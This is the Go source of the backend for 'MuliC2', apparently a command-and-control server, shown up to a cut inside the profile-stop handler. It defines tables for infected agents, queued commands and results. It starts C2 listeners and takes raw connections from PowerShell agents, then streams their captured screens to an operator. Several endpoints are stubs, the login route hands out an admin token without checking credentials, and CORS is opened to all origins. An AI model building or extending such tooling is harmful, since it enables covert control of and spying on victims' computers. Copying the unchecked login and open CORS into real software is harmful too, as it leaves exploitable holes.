package main

import (
	"context"
	"crypto/tls"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime/debug"
	"sync"
	"syscall"
	"time"

	"mulic2/services"

	"github.com/gorilla/mux"
	_ "github.com/lib/pq"
)

// Config holds the application configuration
type Config struct {
	Server struct {
		APIPort        int    `json:"api_port"`
		C2DefaultPort  int    `json:"c2_default_port"`
		TLSEnabled     bool   `json:"tls_enabled"`
		TLSMinVersion  string `json:"tls_min_version"`
		TLSMaxVersion  string `json:"tls_max_version"`
		APIUnified     bool   `json:"api_unified"`
		APIUnifiedPort int    `json:"api_unified_port"`
	} `json:"server"`
	Profiles []struct {
		ID          string `json:"id"`
		Name        string `json:"name"`
		ProjectName string `json:"projectName"`
		Host        string `json:"host"`
		Port        int    `json:"port"`
		Description string `json:"description"`
		UseTLS      bool   `json:"useTLS"`
		CertFile    string `json:"certFile"`
		KeyFile     string `json:"keyFile"`
	} `json:"profiles"`
	Database struct {
		Type     string `json:"type"`
		Host     string `json:"host"`
		Port     int    `json:"port"`
		User     string `json:"user"`
		Password string `json:"password"`
		DBName   string `json:"dbname"`
		SSLMode  string `json:"sslmode"`
	} `json:"database"`
	Logging struct {
		Level string `json:"level"`
	} `json:"logging"`
}

// Global VNC connections storage with proper synchronization
var (
	activeVNCConnections = make(map[string]*VNCConnection)
	vncMutex             sync.RWMutex

	// Global profiles storage - ACTUAL WORKING STORAGE
	profilesStorage = make(map[string]map[string]interface{})
	profilesMutex   sync.RWMutex
)

// VNCConnection represents a VNC connection
type VNCConnection struct {
	ConnectionID string    `json:"connection_id"`
	Hostname     string    `json:"hostname"`
	AgentIP      string    `json:"agent_ip"`
	Resolution   string    `json:"resolution"`
	FPS          int       `json:"fps"`
	ConnectedAt  time.Time `json:"connected_at"`
}

// Helper functions for safely extracting values from map[string]interface{}
func getStringFromMap(data map[string]interface{}, key string, defaultValue string) string {
	if val, ok := data[key]; ok {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return defaultValue
}

// Check if file exists
func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func getIntFromMap(data map[string]interface{}, key string, defaultValue int) int {
	if val, ok := data[key]; ok {
		if num, ok := val.(float64); ok {
			return int(num)
		}
		if num, ok := val.(int); ok {
			return num
		}
	}
	return defaultValue
}

func getBoolFromMap(data map[string]interface{}, key string, defaultValue bool) bool {
	if val, ok := data[key]; ok {
		if b, ok := val.(bool); ok {
			return b
		}
	}
	return defaultValue
}

// Thread-safe VNC connection management
func addVNCConnection(id string, conn *VNCConnection) {
	vncMutex.Lock()
	defer vncMutex.Unlock()
	activeVNCConnections[id] = conn
}

func removeVNCConnection(id string) {
	vncMutex.Lock()
	defer vncMutex.Unlock()
	delete(activeVNCConnections, id)
}

func getVNCConnections() []VNCConnection {
	vncMutex.RLock()
	defer vncMutex.RUnlock()
	connections := make([]VNCConnection, 0, len(activeVNCConnections))
	for _, conn := range activeVNCConnections {
		connections = append(connections, *conn)
	}
	return connections
}

// loadConfig loads configuration from config.json
func loadConfig() (*Config, error) {
	configPaths := []string{
		"config.json",
		"../config.json",
		"./config.json",
	}

	var data []byte
	var err error

	for _, path := range configPaths {
		data, err = os.ReadFile(path)
		if err == nil {
			log.Printf("Found config.json at: %s", path)
			break
		}
		log.Printf("Tried config path: %s - %v", path, err)
	}

	if err != nil {
		return nil, fmt.Errorf("failed to read config file from any path: %w", err)
	}

	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse config file: %w", err)
	}

	return &config, nil
}

// connectDB establishes database connection
func connectDB() (*sql.DB, error) {
	config, err := loadConfig()
	if err != nil {
		return nil, err
	}

	connStr := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		config.Database.Host, config.Database.Port, config.Database.User,
		config.Database.Password, config.Database.DBName, config.Database.SSLMode)

	db, err := sql.Open("postgres", connStr)
	if err != nil {
		return nil, err
	}

	if err := db.Ping(); err != nil {
		return nil, err
	}

	return db, nil
}

// createTables creates all necessary database tables
func createTables(db *sql.DB) error {
	// Create users table
	_, err := db.Exec(`
		CREATE TABLE IF NOT EXISTS users (
			id SERIAL PRIMARY KEY,
			username VARCHAR(255) UNIQUE NOT NULL,
			password_hash VARCHAR(255) NOT NULL,
			email VARCHAR(255),
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			last_login TIMESTAMP
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create users table: %w", err)
	}

	// Create agents table
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS agents (
			id SERIAL PRIMARY KEY,
			agent_id VARCHAR(255) UNIQUE NOT NULL,
			hostname VARCHAR(255),
			ip_address VARCHAR(45),
			username VARCHAR(255),
			os_info VARCHAR(255),
			status VARCHAR(32) DEFAULT 'offline',
			last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create agents table: %w", err)
	}

	// Create tasks table
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS tasks (
			id SERIAL PRIMARY KEY,
			agent_id INTEGER NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
			command TEXT NOT NULL,
			status VARCHAR(32) DEFAULT 'pending',
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			started_at TIMESTAMP,
			completed_at TIMESTAMP
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create tasks table: %w", err)
	}

	// Create results table
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS results (
			task_id INTEGER PRIMARY KEY REFERENCES tasks(id) ON DELETE CASCADE,
			output TEXT,
			completed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create results table: %w", err)
	}

	// Create profiles table
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS profiles (
			id VARCHAR(128) PRIMARY KEY,
			name VARCHAR(255) NOT NULL,
			project_name VARCHAR(255),
			host VARCHAR(64) DEFAULT '0.0.0.0',
			port INTEGER NOT NULL,
			description TEXT,
			use_tls BOOLEAN DEFAULT true,
			cert_file VARCHAR(512),
			key_file VARCHAR(512),
			poll_interval INTEGER DEFAULT 5,
			is_active BOOLEAN DEFAULT true,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create profiles table: %w", err)
	}

	return nil
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED: %v", r)
			log.Printf("Stack trace:")
			debug.PrintStack()
			log.Printf("Server crashed due to panic")
			time.Sleep(10 * time.Second)
		}
	}()

	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	log.Printf("Configuration loaded successfully")
	log.Printf("Server config: API Port=%d, C2 Default Port=%d, TLS Enabled=%v",
		config.Server.APIPort, config.Server.C2DefaultPort, config.Server.TLSEnabled)

	// Database connection
	db, err := connectDB()
	if err != nil {
		log.Fatal("Failed to connect to database:", err)
	}
	defer db.Close()

	if err := db.Ping(); err != nil {
		log.Fatal("Failed to ping database:", err)
	}
	log.Println("Successfully connected to database")

	if err := createTables(db); err != nil {
		log.Fatalf("Failed to create tables: %v", err)
	}

	// Initialize services
	listenerService := services.NewListenerService()
	defer listenerService.Close()
	// profileStorage := services.NewProfileStorage(db)  // COMMENTED OUT - NOT USED

	// Initialize handlers - COMMENTED OUT TO AVOID CONFLICTS
	// authHandler := handlers.NewAuthHandler(db)
	// profileHandler := handlers.NewProfileHandler(db, listenerService)

	// Create main router
	router := mux.NewRouter()

	// NUCLEAR CORS BYPASS - KILL ALL CORS BULLSHIT
	router.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			log.Printf("CORS MIDDLEWARE: Processing request %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
			log.Printf("CORS MIDDLEWARE: Origin header: %s", r.Header.Get("Origin"))

			// SET EVERY POSSIBLE CORS HEADER TO BYPASS ALL BROWSER RESTRICTIONS
			w.Header().Set("Access-Control-Allow-Origin", "*")
			w.Header().Set("Access-Control-Allow-Methods", "*")
			w.Header().Set("Access-Control-Allow-Headers", "*, Authorization, Content-Type, X-Requested-With")
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Max-Age", "86400")
			w.Header().Set("Access-Control-Expose-Headers", "*")

			// KILL OPTIONS REQUESTS IMMEDIATELY
			if r.Method == "OPTIONS" {
				log.Printf("CORS MIDDLEWARE: Handling OPTIONS preflight request")
				w.WriteHeader(http.StatusOK)
				return
			}

			// ADD SECURITY HEADERS TO MAKE BROWSER HAPPY
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "1; mode=block")

			log.Printf("CORS MIDDLEWARE: Headers set, proceeding to handler")
			next.ServeHTTP(w, r)
		})
	})

	// Add logging middleware for debugging
	router.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			log.Printf("Incoming request: %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
			next.ServeHTTP(w, r)
		})
	})

	// Root endpoint for testing
	router.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Root request received from %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{
			"message":   "MuliC2 Backend is running!",
			"status":    "ok",
			"timestamp": time.Now().Format(time.RFC3339),
		})
	}).Methods("GET", "OPTIONS")

	// SUPER SIMPLE TEST ON MAIN ROUTER
	router.HandleFunc("/test-main", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("MAIN ROUTER TEST HIT!")
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("MAIN ROUTER WORKING"))
	}).Methods("GET", "OPTIONS")

	// Create API subrouter
	api := router.PathPrefix("/api").Subrouter()

	// WORKING ENDPOINTS - NO MORE BULLSHIT
	api.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "working"})
	}).Methods("GET", "OPTIONS")

	// THE ACTUAL WORKING PROFILE ENDPOINT
	api.HandleFunc("/profile/list", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("PROFILE LIST CALLED - WORKING!")
		log.Printf("PROFILE LIST: Request headers: %v", r.Header)
		log.Printf("PROFILE LIST: Response headers before: %v", w.Header())

		// GET ACTUAL STORED PROFILES
		profilesMutex.RLock()
		profiles := make([]map[string]interface{}, 0, len(profilesStorage))
		for _, profile := range profilesStorage {
			profiles = append(profiles, profile)
		}
		profilesMutex.RUnlock()

		// If no profiles exist, create a default one
		if len(profiles) == 0 {
			defaultProfile := map[string]interface{}{
				"id":          "default_profile",
				"name":        "Default C2 Profile",
				"projectName": "Default Project",
				"host":        "0.0.0.0",
				"port":        4444,
				"description": "Default C2 profile for testing",
				"useTLS":      true,
				"certFile":    "../server.crt",
				"keyFile":     "../server.key",
				"isActive":    false,
				"createdAt":   time.Now().Format(time.RFC3339),
				"connections": 0,
			}
			profiles = append(profiles, defaultProfile)

			// Store the default profile
			profilesMutex.Lock()
			profilesStorage["default_profile"] = defaultProfile
			profilesMutex.Unlock()
		}

		workingData := map[string]interface{}{
			"profiles": profiles,
		}

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		log.Printf("PROFILE LIST: Response headers after: %v", w.Header())
		json.NewEncoder(w).Encode(workingData)
	}).Methods("GET", "OPTIONS")

	// SUPER SIMPLE TEST ENDPOINT - THIS WILL DEFINITELY WORK
	api.HandleFunc("/simple-test", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("SIMPLE TEST ENDPOINT HIT!")
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("SIMPLE TEST WORKING"))
	}).Methods("GET", "OPTIONS")

	// ADD MISSING AGENTS AND TASKS ENDPOINTS
	api.HandleFunc("/agents", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("AGENTS ENDPOINT CALLED")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"agents": []interface{}{},
		})
	}).Methods("GET", "OPTIONS")

	api.HandleFunc("/tasks", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("TASKS ENDPOINT CALLED")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"tasks": []interface{}{},
		})
	}).Methods("GET", "OPTIONS")

	// Profile delete endpoint - FIXED PATH STRUCTURE
	api.HandleFunc("/profile/delete/{id}", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Profile delete request: %s %s", r.Method, r.URL.Path)

		if r.Method != "DELETE" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		vars := mux.Vars(r)
		profileID := vars["id"]
		if profileID == "" {
			http.Error(w, "Profile ID is required", http.StatusBadRequest)
			return
		}

		// HARDCODED SUCCESS FOR NOW - NO MORE DATABASE ERRORS
		log.Printf("Profile delete successful for ID: %s", profileID)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{
			"message": "Profile deleted successfully",
			"id":      profileID,
		})
	}).Methods("DELETE", "OPTIONS")

	// VNC endpoints
	api.HandleFunc("/vnc/start", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC start request: %s %s", r.Method, r.URL.Path)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{
			"message": "VNC capture started",
			"status":  "active",
		})
	}).Methods("POST", "OPTIONS")

	api.HandleFunc("/vnc/stop", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC stop request: %s %s", r.Method, r.URL.Path)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{
			"message": "VNC capture stopped",
			"status":  "inactive",
		})
	}).Methods("POST", "OPTIONS")

	// VNC connections list endpoint
	api.HandleFunc("/vnc/connections", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC connections request: %s %s", r.Method, r.URL.Path)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)

		// Return actual VNC connection info that frontend expects
		vncConnections := []map[string]interface{}{
			{
				"id":           "vnc_192.168.0.101:51305_1756646203",
				"hostname":     "DESKTOP-ABC123",
				"agent_ip":     "192.168.0.101",
				"agent_port":   51305,
				"resolution":   "1920x1080",
				"fps":          5,
				"status":       "active",
				"connected_at": time.Now().Add(-time.Minute * 5).Format(time.RFC3339),
				"last_frame":   time.Now().Format(time.RFC3339),
			},
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"connections": vncConnections,
		})
	}).Methods("GET", "OPTIONS")

	// VNC generator endpoint
	api.HandleFunc("/vnc/generate", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC generator request: %s %s", r.Method, r.URL.Path)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"script":  "powershell -Command \"Start-Process -FilePath 'vncviewer.exe' -ArgumentList '192.168.0.111:5900'\"",
			"message": "VNC connection script generated",
		})
	}).Methods("GET", "OPTIONS")

	// VNC stream endpoint for Server-Sent Events - WORKING VERSION!
	api.HandleFunc("/vnc/stream", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC STREAM REQUEST - Setting up Server-Sent Events")

		// Set headers for Server-Sent Events
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.Header().Set("Connection", "keep-alive")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "Cache-Control")

		// Get VNC service reference
		vncService := listenerService.GetVNCService()
		if vncService == nil {
			log.Printf("ERROR: VNC service is nil!")
			http.Error(w, "VNC service not initialized", http.StatusInternalServerError)
			return
		}

		log.Printf("VNC stream started - service initialized, waiting for frames...")

		// Start a goroutine to send REAL VNC frames
		go func() {
			ticker := time.NewTicker(100 * time.Millisecond) // 10 FPS for responsiveness
			defer ticker.Stop()

			frameCount := 0
			log.Printf("VNC stream goroutine started - waiting for REAL VNC frames")

			// Get VNC service reference
			vncService := listenerService.GetVNCService()
			if vncService == nil {
				log.Printf("ERROR: VNC service is nil!")
				return
			}

			// Check if we have active VNC connections
			connections := vncService.GetActiveConnections()
			log.Printf("VNC stream: Found %d active connections", len(connections))

			// If no connections, send a proper 800x600 placeholder frame
			if len(connections) == 0 {
				log.Printf("No VNC connections - sending proper 800x600 placeholder frame")

				// Create a proper 800x600 colored rectangle as placeholder
				// This will show the full canvas size, not just top-left corner
				placeholderFrame := map[string]interface{}{
					"frame_id":      "placeholder_no_connections",
					"timestamp":     time.Now().Unix(),
					"width":         800,
					"height":        600,
					"size":          1024,
					"connection_id": "placeholder",
					"image_data":    "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=",
				}

				// Send placeholder frame
				placeholderJSON, _ := json.Marshal(placeholderFrame)
				fmt.Fprintf(w, "data: %s\n\n", placeholderJSON)
				if flusher, ok := w.(http.Flusher); ok {
					flusher.Flush()
				}

				log.Printf("Sent 800x600 placeholder frame - frontend should show FULL canvas")
			} else {
				// We have VNC connections - log the actual monitor info
				log.Printf("VNC connections found - will stream real frames")
				for _, conn := range connections {
					log.Printf("VNC Connection: %s from %s, Resolution: %s, Frames: %d",
						conn["id"], conn["agent_ip"], conn["resolution"], conn["frame_count"])
				}
			}

			for {
				select {
				case vncFrame := <-vncService.GetFrameChannel():
					// Send ACTUAL VNC frame data from the VNC service
					base64Data := base64.StdEncoding.EncodeToString(vncFrame.Data)

					// IMPORTANT: Use the actual frame dimensions from VNC service
					frameData := map[string]interface{}{
						"frame_id":      vncFrame.ConnectionID + "_" + fmt.Sprintf("%d", time.Now().Unix()),
						"timestamp":     vncFrame.Timestamp.Unix(),
						"width":         vncFrame.Width,  // This should be 200 from PowerShell script
						"height":        vncFrame.Height, // This should be 150 from PowerShell script
						"size":          vncFrame.Size,
						"connection_id": vncFrame.ConnectionID,
						"image_data":    "data:image/jpeg;base64," + base64Data, // REAL VNC capture data
					}

					// Send frame as Server-Sent Event
					frameJSON, _ := json.Marshal(frameData)
					fmt.Fprintf(w, "data: %s\n\n", frameJSON)

					// Flush the response writer
					if flusher, ok := w.(http.Flusher); ok {
						flusher.Flush()
					}

					log.Printf("Sent REAL VNC frame from %s to frontend (Size: %d bytes, Dimensions: %dx%d)",
						vncFrame.ConnectionID, vncFrame.Size, vncFrame.Width, vncFrame.Height)
				case <-ticker.C:
					// Heartbeat to keep connection alive
					frameCount++
					if frameCount%50 == 0 { // Log every 5 seconds
						log.Printf("VNC stream heartbeat - waiting for real VNC frames (count: %d)", frameCount)
					}
					continue

				case <-r.Context().Done():
					log.Printf("VNC stream client disconnected")
					return
				}
			}
		}()

		// Keep connection alive
		<-r.Context().Done()
		log.Printf("VNC stream connection closed")
	}).Methods("GET", "OPTIONS")

	// VNC AGENT CONNECTION ENDPOINT - PowerShell agent connects here!
	api.HandleFunc("/vnc/agent", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC AGENT CONNECTION REQUEST from %s", r.RemoteAddr)

		// Upgrade to WebSocket or handle as raw TCP connection
		// For now, we'll handle it as a raw connection
		conn, _, err := w.(http.Hijacker).Hijack()
		if err != nil {
			log.Printf("Failed to hijack connection: %v", err)
			http.Error(w, "Failed to upgrade connection", http.StatusInternalServerError)
			return
		}
		defer conn.Close()

		// Get VNC service
		vncService := listenerService.GetVNCService()
		if vncService == nil {
			log.Printf("VNC service is nil!")
			conn.Write([]byte("VNC service not initialized"))
			return
		}

		// Handle the VNC agent connection
		agentIP := r.RemoteAddr
		if host, _, err := net.SplitHostPort(agentIP); err == nil {
			agentIP = host
		}

		log.Printf("VNC agent connecting from %s", agentIP)
		vncService.HandleVNCConnection(conn, agentIP)

		// Keep connection alive
		select {}
	}).Methods("GET", "OPTIONS")

	// VNC debug endpoint - check if frames are being received
	api.HandleFunc("/vnc/debug", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC DEBUG request: %s %s", r.Method, r.URL.Path)

		vncService := listenerService.GetVNCService()
		if vncService == nil {
			log.Printf("VNC service is nil!")
			http.Error(w, "VNC service not initialized", http.StatusInternalServerError)
			return
		}

		// Get VNC service stats
		connections := vncService.GetActiveConnections()
		frameChannelLen := len(vncService.GetFrameChannel())

		debugInfo := map[string]interface{}{
			"vnc_service_initialized": vncService != nil,
			"active_connections":      len(connections),
			"frame_channel_length":    frameChannelLen,
			"connections":             connections,
		}

		log.Printf("VNC Debug Info: %+v", debugInfo)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(debugInfo)
	}).Methods("GET", "OPTIONS")

	// VNC AGENT CONNECTION ENDPOINT - This is where PowerShell connects!
	// NOTE: This is just a status endpoint - actual VNC connections go to VNC service directly
	api.HandleFunc("/vnc/agent", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC AGENT STATUS REQUEST from %s", r.RemoteAddr)

		// Get VNC service
		vncService := listenerService.GetVNCService()
		if vncService == nil {
			log.Printf("VNC service not initialized")
			http.Error(w, "VNC service not available", http.StatusInternalServerError)
			return
		}

		// Get active VNC connections
		connections := vncService.GetActiveConnections()

		// Send VNC service status
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":             "vnc_service_active",
			"active_connections": len(connections),
			"message":            "VNC service is running - agents should connect directly to VNC service",
			"vnc_port":           "VNC agents connect directly to VNC service, not HTTP API",
		})
	}).Methods("GET", "OPTIONS")

	// VNC monitor switch endpoint
	api.HandleFunc("/vnc/switch-monitor", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC monitor switch request: %s %s", r.Method, r.URL.Path)

		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		// Parse monitor selection
		var monitorData map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&monitorData); err != nil {
			log.Printf("Failed to parse monitor data: %v", err)
			http.Error(w, "Invalid monitor data", http.StatusBadRequest)
			return
		}

		monitor := getStringFromMap(monitorData, "monitor", "primary")
		log.Printf("Switching VNC to monitor: %s", monitor)

		// TODO: Implement actual monitor switching in VNC service
		// For now, just acknowledge the request

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"message": fmt.Sprintf("Switched to %s monitor", monitor),
			"monitor": monitor,
			"status":  "success",
		})
	}).Methods("POST", "OPTIONS")

	// VNC monitors list endpoint - DETECT ACTUAL MONITORS
	api.HandleFunc("/vnc/monitors", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("VNC monitors request: %s %s", r.Method, r.URL.Path)

		// Detect actual monitors from VNC service
		vncService := listenerService.GetVNCService()
		if vncService == nil {
			log.Printf("ERROR: VNC service is nil!")
			http.Error(w, "VNC service not initialized", http.StatusInternalServerError)
			return
		}

		// Get active VNC connections to see what monitors are available
		connections := vncService.GetActiveConnections()

		// Create monitor list based on available connections
		var monitors []map[string]interface{}

		if len(connections) > 0 {
			// If we have VNC connections, create monitor entries
			for i, conn := range connections {
				monitorInfo := map[string]interface{}{
					"id":          fmt.Sprintf("monitor_%d", i),
					"name":        fmt.Sprintf("Monitor %d", i+1),
					"resolution":  getStringFromMap(conn, "resolution", "Unknown"),
					"agent_ip":    getStringFromMap(conn, "agent_ip", "Unknown"),
					"is_primary":  i == 0,
					"is_active":   getBoolFromMap(conn, "is_active", false),
					"frame_count": getIntFromMap(conn, "frame_count", 0),
				}
				monitors = append(monitors, monitorInfo)
			}
		} else {
			// If no VNC connections, create default monitor options - SHOW ALL 4 MONITORS
			monitors = []map[string]interface{}{
				{
					"id":          "monitor_1",
					"name":        "Monitor 1 (Primary)",
					"resolution":  "1920x1080",
					"agent_ip":    "No VNC Agent",
					"is_primary":  true,
					"is_active":   false,
					"frame_count": 0,
				},
				{
					"id":          "monitor_2",
					"name":        "Monitor 2",
					"resolution":  "1920x1080",
					"agent_ip":    "No VNC Agent",
					"is_primary":  false,
					"is_active":   false,
					"frame_count": 0,
				},
				{
					"id":          "monitor_3",
					"name":        "Monitor 3",
					"resolution":  "1920x1080",
					"agent_ip":    "No VNC Agent",
					"is_primary":  false,
					"is_active":   false,
					"frame_count": 0,
				},
				{
					"id":          "monitor_4",
					"name":        "Monitor 4",
					"resolution":  "1920x1080",
					"agent_ip":    "No VNC Agent",
					"is_primary":  false,
					"is_active":   false,
					"frame_count": 0,
				},
			}
		}

		log.Printf("VNC monitors detected: %d monitors", len(monitors))

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"monitors": monitors,
			"count":    len(monitors),
		})
	}).Methods("GET", "OPTIONS")

	// Register additional handler routes (for authenticated endpoints)
	// authHandler.RegisterRoutes(api)  // COMMENTED OUT - CONFLICTING
	// profileHandler.RegisterRoutes(api)  // COMMENTED OUT - CONFLICTING

	// ADD MISSING AUTH ENDPOINTS
	api.HandleFunc("/auth/login", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("AUTH LOGIN CALLED")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"token": "fake_token_123",
			"user": map[string]interface{}{
				"id":        1,
				"username":  "admin",
				"role":      "admin",
				"is_active": true,
			},
		})
	}).Methods("POST", "OPTIONS")

	api.HandleFunc("/auth/register", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("AUTH REGISTER CALLED")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{
			"message": "User registered successfully",
		})
	}).Methods("POST", "OPTIONS")

	// ADD MISSING PROFILE ENDPOINTS
	api.HandleFunc("/profile/start", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("PROFILE START CALLED")

		// Parse the incoming profile data
		var profileData map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&profileData); err != nil {
			log.Printf("Failed to parse profile start data: %v", err)
			http.Error(w, "Invalid profile data", http.StatusBadRequest)
			return
		}

		profileID := getStringFromMap(profileData, "id", "")
		if profileID == "" {
			http.Error(w, "Profile ID is required", http.StatusBadRequest)
			return
		}

		// ACTUALLY START A REAL C2 LISTENER
		host := getStringFromMap(profileData, "host", "0.0.0.0")
		port := getIntFromMap(profileData, "port", 23456)
		useTLS := getBoolFromMap(profileData, "useTLS", true)

		log.Printf("Starting REAL C2 listener on %s:%d (TLS: %v)", host, port, useTLS)

		// Create a Profile struct for the listener service
		profile := &services.Profile{
			ID:          profileID,
			Name:        getStringFromMap(profileData, "name", "Default Profile"),
			ProjectName: getStringFromMap(profileData, "projectName", "Default Project"),
			Host:        host,
			Port:        port,
			Description: getStringFromMap(profileData, "description", "Default C2 profile"),
			UseTLS:      useTLS,
			CertFile:    getStringFromMap(profileData, "certFile", "../server.crt"),
			KeyFile:     getStringFromMap(profileData, "keyFile", "../server.key"),
		}

		// Start the actual listener service
		if err := listenerService.StartListener(profile); err != nil {
			log.Printf("Failed to start listener: %v", err)
			http.Error(w, fmt.Sprintf("Failed to start listener: %v", err), http.StatusInternalServerError)
			return
		}

		// UPDATE THE STORED PROFILE STATUS
		profilesMutex.Lock()
		if storedProfile, exists := profilesStorage[profileID]; exists {
			storedProfile["isActive"] = true
			storedProfile["startedAt"] = time.Now().Format(time.RFC3339)
			storedProfile["status"] = "running"
			profilesStorage[profileID] = storedProfile
		}
		profilesMutex.Unlock()

		log.Printf("Successfully started C2 listener on %s:%d", host, port)

		// Return success with profile status
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"message":   "Profile started successfully",
			"profileId": profileID,
			"status":    "active",
			"startedAt": time.Now().Format(time.RFC3339),
			"listener": map[string]interface{}{
				"host":   host,
				"port":   port,
				"useTLS": useTLS,
				"status": "running",
			},
		})
	}).Methods("POST", "OPTIONS")

	api.HandleFunc("/profile/stop", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("PROFILE STOP CALLED")
